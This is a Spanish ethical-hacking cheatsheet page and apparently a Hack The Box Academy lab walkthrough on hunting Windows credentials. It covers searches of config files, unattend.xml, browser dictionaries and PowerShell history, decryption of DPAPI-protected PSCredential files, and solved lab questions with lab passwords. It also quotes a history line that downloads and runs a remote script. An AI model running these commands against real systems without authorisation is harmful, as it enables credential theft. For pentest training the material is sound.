
# Búsqueda de credenciales en Windows

Las credenciales pueden abrirnos muchas puertas durante nuestras evaluaciones. Podemos encontrar credenciales durante nuestra enumeración de escalada de privilegios que pueden conducirnos directamente al acceso de administrador local, otorgarnos un punto de apoyo en el entorno de dominio de Active Directory o incluso usarse para escalar privilegios dentro del dominio. Hay muchos lugares en los que podemos encontrar credenciales en un sistema, algunas más obvias que otras.

#### Artículo relacionado

{% content-ref url="/pages/FiA4f1I0RekV8H1KNzb8" %}
[Credential Hunting - Windows](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/password-attacks/windows-attacks/credential-hunting-windows.md)
{% endcontent-ref %}

***

## <mark style="color:purple;">Archivos de configuración</mark>

### **Buscando archivos**

En contra de las mejores prácticas, las aplicaciones suelen almacenar contraseñas en archivos de configuración de texto sin formato. Supongamos que obtenemos la ejecución de un comando en el contexto de una cuenta de usuario sin privilegios. En ese caso, es posible que podamos encontrar las credenciales para su cuenta de administrador u otra cuenta local o de dominio con privilegios. Podemos usar la utilidad [findstr](https://ss64.com/nt/findstr.html) para buscar esta información confidencial.

```powershell
PS C:\htb> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

La información confidencial de IIS, como las credenciales, se puede almacenar en un archivo `web.config`. En el caso del sitio web predeterminado de IIS, este archivo podría estar ubicado en `C:\inetpub\wwwroot\web.config`, pero puede haber varias versiones de este archivo en diferentes ubicaciones, que podemos buscar de forma recursiva.

***

## <mark style="color:purple;">Archivos de diccionario</mark>

#### **Archivos del diccionario de Chrome**

Otro caso interesante son los archivos de diccionario. Por ejemplo, se puede introducir información confidencial, como contraseñas, en un cliente de correo electrónico o en una aplicación basada en navegador, que subraya las palabras que no reconoce. El usuario puede añadir estas palabras a su diccionario para evitar el subrayado rojo que distrae.

```powershell
PS C:\htb> gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password

Password1234!
```

***

## <mark style="color:purple;">Archivos de instalación desatendida</mark>

Los archivos de instalación desatendida pueden definir configuraciones de inicio de sesión automático o cuentas adicionales que se crearán como parte de la instalación. Las contraseñas en `unattend.xml` se almacenan en texto simple o codificadas en base64.

### **Unattend.xml**

```powershell
PS C:\Users\backupadm> Get-ChildItem -Path C:\ -Recurse -Include Unattend.xml, Autounattend.xml -ErrorAction SilentlyContinue -Force |
Select-Object FullName, Length, LastWriteTime

FullName                        Length LastWriteTime
--------                        ------ -------------
C:\panther\unattend.xml           6995 6/1/2022 2:17:25 PM
C:\Windows\Panther\unattend.xml   2357 6/1/2022 12:11:28 PM
```

```xml
<?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">
    <settings pass="specialize">
        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <AutoLogon>
                <Password>
                    <Value>local_4dmin_p@ss</Value>
                    <PlainText>true</PlainText>
                </Password>
                <Enabled>true</Enabled>
                <LogonCount>2</LogonCount>
                <Username>Administrator</Username>
            </AutoLogon>
            <ComputerName>*</ComputerName>
        </component>
    </settings>
```

Aunque estos archivos deberían eliminarse automáticamente como parte de la instalación, es posible que los administradores de sistemas hayan creado copias del archivo en otras carpetas durante el desarrollo de la imagen y el archivo de respuesta.

***

## <mark style="color:purple;">Archivo de historial de PowerShell</mark>

A partir de PowerShell 5.0 en Windows 10, PowerShell almacena el historial de comandos en el archivo:

* `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`.

### **Confirmación de la ruta de guardado del historial de PowerShell**

Como se ve en el PDF de comandos de Windows (útil), publicado por Microsoft [aquí](https://download.microsoft.com/download/5/8/9/58911986-D4AD-4695-BF63-F734CD4DF8F2/ws-commands.pdf) , hay muchos comandos que pueden pasar credenciales en la línea de comandos. Podemos ver en el ejemplo a continuación que las credenciales administrativas locales especificadas por el usuario para consultar el registro de eventos de la aplicación utilizando [wevutil](https://ss64.com/nt/wevtutil.html) .

```powershell
PS C:\htb> (Get-PSReadLineOption).HistorySavePath

C:\Users\htb-student\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### **Lectura del archivo de historial de PowerShell**

Una vez que conocemos la ubicación del archivo (la ruta predeterminada está arriba), podemos intentar leer su contenido usando `gc`.

```powershell
PS C:\htb> gc (Get-PSReadLineOption).HistorySavePath

dir
cd Temp
md backups
cp c:\inetpub\wwwroot\* .\backups\
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://www.powershellgallery.com/packages/MrAToolbox/1.0.1/Content/Get-IISSite.ps1'))
. .\Get-IISsite.ps1
Get-IISsite -Server WEB02 -web "Default Web Site"
wevtutil qe Application "/q:*[Application [(EventID=3005)]]" /f:text /rd:true /u:WEB02\administrator /p:5erv3rAdmin! /r:WEB02
```

También podemos usar esta línea para recuperar el contenido de todos los archivos del historial de PowerShell a los que podemos acceder como nuestro usuario actual. Esto también puede ser extremadamente útil como paso posterior a la explotación. Siempre debemos volver a verificar estos archivos una vez que tengamos un administrador local si nuestro acceso anterior no nos permitió leer los archivos de algunos usuarios. Este comando supone que se está utilizando la ruta de guardado predeterminada.

```powershell
PS C:\htb> foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}

dir
cd Temp
md backups
cp c:\inetpub\wwwroot\* .\backups\
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://www.powershellgallery.com/packages/MrAToolbox/1.0.1/Content/Get-IISSite.ps1'))
. .\Get-IISsite.ps1
Get-IISsite -Server WEB02 -web "Default Web Site"
wevtutil qe Application "/q:*[Application [(EventID=3005)]]" /f:text /rd:true /u:WEB02\administrator /p:5erv3rAdmin! /r:WEB02
```

***

## <mark style="color:purple;">Relacionado</mark>

Podemos ver más técnicas de Credential Hunting en Windows en las siguientes secciones:

{% content-ref url="/pages/FiA4f1I0RekV8H1KNzb8" %}
[Credential Hunting - Windows](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/password-attacks/windows-attacks/credential-hunting-windows.md)
{% endcontent-ref %}

{% content-ref url="/pages/9xzf7d8zAPvwAV18ZDzr" %}
[Otros robos de credenciales en Windows](/ethical-hacking-cheatsheet/post-explotacion/escalada-de-privilegios/escalada-de-privilegios-en-windows/robo-de-credenciales-en-windows/otros-robos-de-credenciales-en-windows.md)
{% endcontent-ref %}

***

## <mark style="color:purple;">Credenciales de PowerShell</mark>

Las credenciales de PowerShell suelen utilizarse para tareas de automatización y creación de scripts como una forma de almacenar credenciales cifradas de forma cómoda. Las credenciales están protegidas mediante [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) , lo que normalmente significa que solo el mismo usuario puede descifrarlas en la misma computadora en la que se crearon.

Tomemos, por ejemplo, el siguiente script `Connect-VC.ps1`, que un administrador de sistemas ha creado para conectarse a un servidor vCenter fácilmente.

```powershell
# Connect-VC.ps1
# Get-Credential | Export-Clixml -Path 'C:\scripts\pass.xml'
$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $decryptedPassword
```

### **Desencriptar credenciales con PowerShell**

Si hemos obtenido la ejecución de comandos en el contexto de este usuario o podemos abusar de DPAPI, entonces podemos recuperar las credenciales de texto sin formato de `encrypted.xml`. El siguiente ejemplo supone lo primero.

```powershell
PS C:\htb> $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
PS C:\htb> $credential.GetNetworkCredential().username

bob


PS C:\htb> $credential.GetNetworkCredential().password

Str0ng3ncryptedP@ss!
```

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 10.129.43.44 (ACADEMY-WINLPE-SRV01)

RDP con el usuario "htb-student" y contraseña "HTB_@cademy_stdnt!"
```

### Pregunta 1

> Busque en el sistema de archivos un archivo que contenga una contraseña. Envíe la contraseña como respuesta.

#### Archivos de configuración con contraseñas

<pre class="language-powershell"><code class="lang-powershell">PS C:\Users\htb-student> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
<strong>
</strong><strong>AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt
</strong>AppData\Local\Google\Chrome\User Data\ZxcvbnData\1\passwords.txt
AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\AC\AppCache\85D6DEAK\1\C__Windows_SystemApps_Microsoft.Windows.Cortana_cw5n1h2txyewy_cache_Desktop_27[1].txt
&#x3C;---SNIP--->
AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
Documents\stuff.txt

PS C:\Users\htb-student> type Documents\stuff.txt
password: l#-x9r11_2_GL!
</code></pre>

Encontramos varios archivos que contienen contraseñas. El de `stuff.txt` no es la respuesta así que vamos a buscar más.. Buscando en el historial de la terminal nos encontramos unas credenciales de un administrador (pero tampoco es la respuesta a la pregunta):

```powershell
PS C:\Users\htb-student> type AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
dir
cd Temp
md backups
cp c:\inetpub\wwwroot\* .\backups\
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://www.powershellgallery.com/packages/MrAToolbox/1.0.1/Content/Get-IISSite.ps1'))
. .\Get-IISsite.ps1
Get-IISsite -Server WEB02 -web "Default Web Site"
wevtutil qe Application "/q:*[Application [(EventID=3005)]]" /f:text /rd:true /u:WEB02\administrator /p:5erv3rAdmin! /r:
```

Afinando nuestra búsqueda en `C:/Users` encontramos la contraseña que necesitamos:

```powershell
PS C:\Users\htb-student> Get-ChildItem -Path C:\Users -Recurse -Include *.ini,*.txt,*.xml,*.config,*.json,*.yml -ErrorAction SilentlyContinue | Select-String -Pattern "password|pass|credential|key"

Documents\stuff.txt:1:password: l#-x9r11_2_GL!
C:\Users\Public\Documents\settings.xml:105:      <password>Pr0xyadm1nPassw0rd!</password>
C:\Users\Public\Documents\settings.xml:111:   | This is a list of authentication profiles, keyed by the server-id used
C:\Users\Public\Documents\settings.xml:121:     | NOTE: You should either specify username/password OR
C:\Users\Public\Documents\settings.xml:122:     |       privateKey/passphrase, since these pairings are used together.
C:\Users\Public\Documents\settings.xml:127:      <password>repopwd</password>
C:\Users\Public\Documents\settings.xml:131:    <!-- Another sample, using keys to authenticate.
C:\Users\Public\Documents\settings.xml:134:      <privateKey>/path/to/private/key</privateKey>
C:\Users\Public\Documents\settings.xml:135:      <passphrase>optional; leave empty if not used.</passphrase>
```

### Pregunta 2

> Conéctate como usuario `bob` y decodifica las credenciales en el archivo `pass.xml`. Envíe el contenido del archivo `flag.txt` al escritorio una vez que haya terminado.

```
RDP con el usuario "bob" y contraseña "Str0ng3ncryptedP@ss!"
```

#### Encontrar el  archivo

```powershell
Get-ChildItem -Path C:\Users\bob -Recurse -Filter pass.xml

    Directory: C:\Scripts

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/24/2021   6:08 PM           1828 pass.xml
```

El archivo `pass.xml` contiene credenciales almacenadas como un **objeto PSCredential** de PowerShell, y la contraseña está protegida con **DPAPI (Data Protection API)**. Para descifrarla, necesitas ejecutarlo en la misma máquina donde se generó.

```xml
PS C:\Scripts> type .\pass.xml

<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">bob</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb0100000016548747b77ab84f9262fa5a851d5f71000000000200000000001066000000010000200000002494ddabd3338a4fccf788171788421fefac6998b41a9c05beeb5a9a5dc39cb6000000000e8000000002000020000000736dfd85852ebbabd9d902c6450c4c51ee78f0d2e4f5c895dc1363b7178f2e0c30000000017cca90a9f8861150c51de9504bb3a3e591b85f834f8b53134f5258541fbda6ec9941ae6fa99db5e0b2e82ba0a170b04000000064b5740c7e8f2e845293abdf942e54dff0e4a563770b99e7cf9d74b6e7726143ade7ce82db92689f59291826b32098553e6b3786e3bacf4ee1af0df529b9a583</SS>
    </Props>
  </Obj>
</Objs>
```

#### Desencriptar el password con Powershell

```powershell
PS C:\Scripts> $Cred = Import-Clixml -Path C:\Scripts\pass.xml
PS C:\Scripts> $Cred.GetNetworkCredential().Password
Str0ng3ncryptedP@ss!
```

Eso nos muestra la contraseña en plano!
